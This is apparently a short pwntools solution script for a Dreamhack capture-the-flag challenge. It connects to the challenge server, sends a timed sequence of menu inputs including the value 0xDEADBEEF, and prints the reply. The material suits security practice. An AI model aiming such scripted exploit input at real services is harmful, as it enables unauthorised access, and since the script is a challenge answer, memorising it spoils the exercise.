from pwn import *

port = 11055
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b"Input: ", b"2")
pause(2)
rem.sendlineafter(b"Input: ", b"1")
rem.sendlineafter(b"Input: ", b"3735928559")
pause(0xA - 2)
rem.sendlineafter(b"Input: ", b"3")
print(rem.recvline())